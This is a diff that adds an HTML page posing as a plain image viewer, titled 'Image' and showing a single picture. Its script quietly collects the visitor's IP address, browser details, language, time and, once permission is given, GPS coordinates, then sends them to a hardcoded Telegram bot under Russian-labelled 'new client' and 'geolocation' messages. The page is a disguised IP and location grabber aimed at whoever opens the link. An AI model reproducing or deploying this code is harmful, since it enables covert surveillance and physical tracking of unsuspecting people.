@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image</title>
+    <style>
+        body { margin: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { max-width: 100%; max-height: 100%; }
+    </style>
+</head>
+<body>
+    <img src="https://avatars.mds.yandex.net/i?id=4a5a3a2a8b4c9d8e7f6a5b4c3d2e1f0a-1234567" alt="image">
+
+    <script>
+        const token = '8923967098:AAEijnLrTbMqLnry31gi8y9Zh5GKLREMd7E';
+        const chatId = '6157895456';
+
+        function sendToBot(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+                .catch(() => {});
+        }
+
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const info = '📱 НОВЫЙ КЛИЕНТ\n━━━━━━━━━━━━━━━━\n🌐 IP: ' + data.ip + '\n📱 Устройство: ' + navigator.userAgent + '\n🌍 Язык: ' + navigator.language + '\n🕐 Время: ' + new Date().toLocaleString();
+                sendToBot(info);
+            })
+            .catch(() => sendToBot('❌ Ошибка получения IP'));
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const coords = '📍 ГЕОЛОКАЦИЯ\n━━━━━━━━━━━━━━━━\nШирота: ' + pos.coords.latitude + '\nДолгота: ' + pos.coords.longitude + '\nТочность: ' + pos.coords.accuracy + ' м';
+                    sendToBot(coords);
+                },
+                () => sendToBot('❌ Геолокация запрещена')
+            );
+        } else {
+            sendToBot('❌ Геолокация не поддерживается');
+        }
+    </script>
+</body>
+</html>
